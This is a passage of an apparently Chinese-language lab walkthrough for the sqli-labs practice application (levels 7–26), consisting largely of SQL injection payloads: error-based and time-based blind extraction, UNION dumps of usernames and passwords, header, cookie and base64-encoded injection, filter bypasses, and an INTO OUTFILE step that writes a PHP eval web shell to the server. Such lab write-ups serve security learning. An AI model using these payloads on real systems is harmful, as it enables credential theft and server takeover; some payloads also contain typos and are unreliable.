+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7e),1)--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309200939545.png" alt="image-20230309200939545"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),0x7e),1)--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309200958168.png" alt="image-20230309200958168"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select group_concat(id) from users),0x7e),1)--+</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309201454854.png" alt="image-20230309201454854"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select concat(username,0x3a,password) from users limit 0,1),0x7e),1) --+</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h3 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h3><p><strong>文件读写注入</strong></p>
+<p>界面显示Use outfile</p>
+<p>select查询对文件有操作</p>
+<p>读取文档：<code>load_file()</code></p>
+<p>导出文档：<code>into outfile()</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)) union select 1,&#x27;&lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt;&#x27;,3 into outfile &#x27;D:\\phpstudy_pro\\WWW\\sql-lab\\Less-7\\test.php&#x27; --+</span><br></pre></td></tr></table></figure>
+
+<p>虽然报错，但是在目的文件下可以看到文件建立</p>
+<blockquote>
+<p>注：方法需要mysql数据库开启secure-file-priv写文件权限，否则不能写入文件。</p>
+<p>如果使用的时phpstudy，或xammp修改环境里的mysql配置文件。</p>
+<p>进入mysql安装目录，找到my.ini 修改里面的secure-file-priv参数</p>
+<p>如果没有secure_file_priv这个选项，直接添加即可。</p>
+</blockquote>
+<p>完成后可以通过蚁剑链接</p>
+<h3 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h3><p>经过测试发现报错注入（双注入）没有回显，故采用延时注入，</p>
+<h4 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select if(ascii(substring(&quot;hello&quot;,1,1))&gt;120,sleep(10),1);</span><br></pre></td></tr></table></figure>
+
+<p>如果字符串hello的1位字符的ASCII码大于120 的话演延时10秒否则输出1</p>
+<p>利用此原理，</p>
+<h4 id="猜解数据库名"><a href="#猜解数据库名" class="headerlink" title="猜解数据库名"></a><strong>猜解数据库名</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(ascii(substring(database(),1,1))=115,sleep(10),1)--+</span><br></pre></td></tr></table></figure>
+
+<p>发现页面有明显延时，说明猜解正确</p>
+<p>依次猜解数据库其他字符</p>
+<h4 id="猜解表名"><a href="#猜解表名" class="headerlink" title="猜解表名"></a><strong>猜解表名</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(10),1)--+</span><br></pre></td></tr></table></figure>
+
+<h4 id="猜解字段"><a href="#猜解字段" class="headerlink" title="猜解字段"></a>猜解字段</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(ascii(substring((select column_name from informaton_schema.columns where column_schema=database() limit 0,1),1,1))=111,sleep(10),1);--+</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="猜内容"><a href="#猜内容" class="headerlink" title="猜内容"></a>猜内容</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; if(ascii(substring((select username from security.users order by id limit 0,1),1,1))=68,sleep(10),1)--+</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h3><p>基于单引号的盲注</p>
+<p>经过测试，使用时间延时注入</p>
+<p>…</p>
+<h3 id="less-10"><a href="#less-10" class="headerlink" title="less-10"></a>less-10</h3><p>基于双引号的盲注</p>
+<p>…</p>
+<hr>
+<h2 id="POST类型"><a href="#POST类型" class="headerlink" title="POST类型"></a>POST类型</h2><h3 id="less-11"><a href="#less-11" class="headerlink" title="less-11"></a>less-11</h3><p>单引号POST注入</p>
+<p>使用万能密码尝试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; or 1=1#</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309211838312.png" alt="image-20230309211838312"></p>
+<h4 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; order by 3#</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309211744303.png" alt="image-20230309211744303"></p>
+<h4 id="判断显示位"><a href="#判断显示位" class="headerlink" title="判断显示位"></a>判断显示位</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,2#</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309212019548.png" alt="image-20230309212019548"></p>
+<h4 id="爆数据库"><a href="#爆数据库" class="headerlink" title="爆数据库"></a>爆数据库</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,database()#</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309212212022.png" alt="image-20230309212212022"></p>
+<h4 id="爆数据表"><a href="#爆数据表" class="headerlink" title="爆数据表"></a>爆数据表</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; #</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309212657995.png" alt="image-20230309212657995"></p>
+<h4 id="爆user表的列"><a href="#爆user表的列" class="headerlink" title="爆user表的列"></a>爆user表的列</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; #</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310123931247.png" alt="image-20230310123931247"></p>
+<h4 id="爆破用户名和密码"><a href="#爆破用户名和密码" class="headerlink" title="爆破用户名和密码"></a>爆破用户名和密码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(username,&#x27;:&#x27;,password) from users #</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310124152729.png" alt="image-20230310124152729"></p>
+<h3 id="less-12"><a href="#less-12" class="headerlink" title="less-12"></a>less-12</h3><p><code>&quot;)</code>闭合POST注入</p>
+<p>与pass-11类似</p>
+<h3 id="less-13"><a href="#less-13" class="headerlink" title="less-13"></a>less-13</h3><p><code>&#39;)</code>POST时间延时注入</p>
+<p>没有回显，采用时间延时注入</p>
+<p>猜解数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;) and if(ascii(substring(database(),1,1))=115,sleep(10),1)# </span><br></pre></td></tr></table></figure>
+
+<p>猜解数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;) and if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1)1,1))=101,sleep(10),1)#</span><br></pre></td></tr></table></figure>
+
+<p>猜解数据表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;) and if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(10),1); #</span><br></pre></td></tr></table></figure>
+
+<p>猜解数据表中的列</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;) and if(ascii(substring((select column_name from information_schema.columns where table_schema=database() limit 0,1),1,1))=101,sleep(10),1); #</span><br></pre></td></tr></table></figure>
+
+
+
+<p>猜内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;) and if(ascii(substring((select username from security.users order by id limit 0,1),1,1))sleep(10),1)#</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="less-14"><a href="#less-14" class="headerlink" title="less-14"></a>less-14</h3><p>基于<code>&quot;</code>的POST时间延时注入</p>
+<p>与13关构造语句类似</p>
+<h3 id="less-15"><a href="#less-15" class="headerlink" title="less-15"></a>less-15</h3><p>基于<code>&#39;</code>的POST时间延时注入</p>
+<p>同上</p>
+<h3 id="less-16"><a href="#less-16" class="headerlink" title="less-16"></a>less-16</h3><p>基于<code>&quot;)</code>的POST时间延时注入</p>
+<p>同上</p>
+<h3 id="less-17"><a href="#less-17" class="headerlink" title="less-17"></a>less-17</h3><p>源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="comment">// truncation (see comments)</span></span><br><span class="line">		<span class="variable">$value</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">get_magic_quotes_gpc</span>())</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="variable">$value</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Quote if not a number</span></span><br><span class="line">		<span class="keyword">if</span> (!<span class="title function_ invoke__">ctype_digit</span>(<span class="variable">$value</span>))</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">		<span class="variable">$value</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$value</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>substr()函数：返回字符串的一部分。相当于对输入长度进行限制</p>
+<p>stripslashes()函数：删除其中的反斜杠</p>
+<p>ctype_digit()函数：做纯数字检测</p>
+<p>mysqli_real_escape_string()函数：对字符串中的特殊字符进行转义，以使得这个字符串是一个合法的sql语句</p>
+<p>intval():获取白能量的整数值</p>
+<p>这里相当与对User name做了严格的过滤，这里尝试用password进行注入</p>
+<p>尝试使用报错注入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1)#</span></span><br></pre></td></tr></table></figure>
+
+<p>发现有回显,然后爆破数据表</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;),0x7e),1)#</span></span><br></pre></td></tr></table></figure>
+
+<p>爆破数据表的列</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;),0x7e),1)#</span></span><br></pre></td></tr></table></figure>
+
+<p>查询相关数据</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e),1)#</span></span><br></pre></td></tr></table></figure>
+
+<p>查询失败,换方法</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; and updatexml(1,concat(0x7e,(select username from(select username from users limit 0,1)test),0x7e),1) #</span></span><br></pre></td></tr></table></figure>
+
+<p>通过用户名查询密码</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; and updatexml(1,concat(0x7e,(select username from (select username from users where username=&#x27;</span>admin<span class="string">&#x27; limit 0,1)test),0x7e),1) #</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="less-18"><a href="#less-18" class="headerlink" title="less-18"></a>less-18</h3><p>输入发现，返回IP和user agent</p>
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310201438889.png" alt="image-20230310201438889"></p>
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;<span class="subst">$uagent</span>&#x27;, &#x27;<span class="subst">$IP</span>&#x27;, <span class="subst">$uname</span>)&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">mysql_query</span>(<span class="variable">$insert</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这里的Username和password都进行了过滤</p>
+<p>所以需要进行先输入正确的账号和密码，随后利用<code>burpsuit</code>处理User Agent部分</p>
+<p>尝试使用报错注入</p>
+<p>数据库</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;or updatexml(1,concat(0x7e,(select database()),0x7e),1) or&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310220335231.png" alt="image-20230310220335231"></p>
+<p>爆破数据表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310220628585.png" alt="image-20230310220628585"></p>
+<p>爆破user中的列</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310221116218.png" alt="image-20230310221116218"></p>
+<p>爆破数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or updatexml (1,concat(0x7e,(select group_concat(username,&quot;:&quot;,password) from users),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310221422607.png" alt="image-20230310221422607"></p>
+<p>使用另一中语句也可以</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or (updatexml(1,concat(0x7e,(SELECT concat_ws(&#x27;:&#x27;,username,password) FROM (SELECT username,password FROM users)text LIMIT 0,1),0x7e),1)) or &#x27; </span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="less-19"><a href="#less-19" class="headerlink" title="less-19"></a>less-19</h3><p>本题显示referer</p>
+<blockquote>
+<p>Referer是 HTTP 头的一个字段，用于告诉服务器该网页是从哪个页面链接过来的。</p>
+</blockquote>
+<p>同上：使用burpsuit抓包，修改referer，报错注入</p>
+<h3 id="less-20"><a href="#less-20" class="headerlink" title="less-20"></a>less-20</h3><p>使用admin，admin尝试</p>
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310222236322.png" alt="image-20230310222236322"></p>
+<p>将cookie改为admin’,刷新界面，发现报错</p>
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310223027399.png" alt="image-20230310223027399"></p>
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310223008881.png" alt="image-20230310223008881"></p>
+<p>修改cookie为sql语句，进行注入</p>
+<p>判断字段数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;order by 4#</span><br></pre></td></tr></table></figure>
+
+<p>判断回显位</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,2,3#</span><br></pre></td></tr></table></figure>
+
+<p>爆破数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,2,database()#</span><br></pre></td></tr></table></figure>
+
+<p>爆破数据表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,2 group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;#</span><br></pre></td></tr></table></figure>
+
+<p>爆破user表中的列</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; #</span><br></pre></td></tr></table></figure>
+
+<p>爆破用户名和密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,2,group_concat(username,&quot;:&quot;,password) from users #</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h3 id="less-21"><a href="#less-21" class="headerlink" title="less-21"></a>less-21</h3><p>使用admin，admin尝试</p>
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310225624359.png" alt="image-20230310225624359"></p>
+<p>其中uname &#x3D; YWRtaW4</p>
+<p>对其进行base64解码就是admin</p>
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230311091328276.png" alt="image-20230311091328276"></p>
+<p><code>&#39;)&#39;</code>注入</p>
+<p>但是要base64加密</p>
+<p><a target="_blank" rel="noopener" href="https://tool.chinaz.com/tools/base64.aspx">Base64编码、解码 - 站长工具 (chinaz.com)</a></p>
+<p>剩余同上</p>
+<p>爆破数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) union select 1,2 database() #</span><br><span class="line">编码结果：JykgdW5pb24gc2VsZWN0IDEsMiBkYXRhYmFzZSgpICM=</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<h3 id="less-22"><a href="#less-22" class="headerlink" title="less-22"></a>less-22</h3><p><code>&quot;</code></p>
+<p>同上</p>
+<h3 id="less-23"><a href="#less-23" class="headerlink" title="less-23"></a>less-23</h3><p>GET型注入</p>
+<h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p><code>preg_replace()</code>函数</p>
+<p>这里相当于将<code>$id</code>中的<code>$reg</code>类型的字符转变位<code>$replace</code>字符，也就是将<code>$id</code>中的<code>#</code>和<code>--</code>置空过滤</p>
+<p>URL终止符<code>%00</code></p>
+<p>注入是后加<code>%00</code>截断即可</p>
+<p>爆破数据库 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,database(); %00</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230311092708372.png" alt="image-20230311092708372"></p>
+<p>爆破数据表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27;; %00</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230311092729640.png" alt="image-20230311092729640"></p>
+<p>爆破users表的列</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27;; %00</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230311092954869.png" alt="image-20230311092954869"></p>
+<p>查询数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(username,&#x27;:&#x27;,password) from users; %00</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230311093018409.png" alt="image-20230311093018409"></p>
+<h3 id="less-24"><a href="#less-24" class="headerlink" title="less-24"></a>less-24</h3><p>二次注入</p>
+<blockquote>
+<p>二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。</p>
+<p>二次注入，可以概括为以下两步:</p>
+<p>第一步：插入恶意数据进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。</p>
+<p>第二步：引用恶意数据开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</p>
+</blockquote>
+<p>普通用户登录admin-admin</p>
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310231157014.png" alt="image-20230310231157014"></p>
+<p>首先创建一个恶意账户</p>
+<p>用户名：admin’#</p>
+<p>密码：123456</p>
+<p>然后登录</p>
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310231451024.png" alt="image-20230310231451024"></p>
+<p>然后修改密码为654321</p>
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310231638264.png" alt="image-20230310231638264"></p>
+<p>然后就可以使用admin-654321登录了</p>
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310231808641.png" alt="image-20230310231808641"></p>
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310231817204.png" alt="image-20230310231817204"></p>
+<h3 id="less-25"><a href="#less-25" class="headerlink" title="less-25"></a>less-25</h3><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310231948302.png" alt="image-20230310231948302"></p>
+<p>可以看出and以及or被替换</p>
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310232138171.png" alt="image-20230310232138171"></p>
+<p>判断字段数</p>
+<p>可以看出order是不行的，但是就可以使用oorrder</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; order by 3--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310232257188.png" alt="image-20230310232257188">![image-20230310232257494](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310232257494.png</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; oorrder by 3--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310232827711.png" alt="image-20230310232827711"></p>
+<p>判断显示位</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,3--+</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230311093221556.png" alt="image-20230311093221556">爆破数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,database()--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230311093600924.png" alt="image-20230311093600924"></p>
+<p>爆破数据表，注意information，要为infoorrmation</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2, group_concat(table_name) from infoorrmation_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230311093535568.png" alt="image-20230311093535568"></p>
+<h3 id="less-25a"><a href="#less-25a" class="headerlink" title="less-25a"></a>less-25a</h3><p>与25类似，没有单引号</p>
+<h3 id="less-26"><a href="#less-26" class="headerlink" title="less-26"></a>less-26</h3><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310234038736.png" alt="image-20230310234038736"></p>
+<blockquote>
+<p>or用 ||oorr 或者%a6%a6替换掉</p>
+<p>and 也以用 &amp;&amp; aandnd 或者%26%26替换掉</p>
+<p>‘#’ 也以用 or ‘1’&#x3D;’1 替换掉</p>
+<p>在这里有一个陌生的符号：\s： 是匹配所有空白符，包括换行，\S 非空白符，不包括换行。也就是说在这里我们无法使用空格 ，\s会将其消掉。</p>
+<p>%0a可以代替空格，或者使用()将其包起来</p>
+</blockquote>
+<p>使用%0a爆破数据库</p>
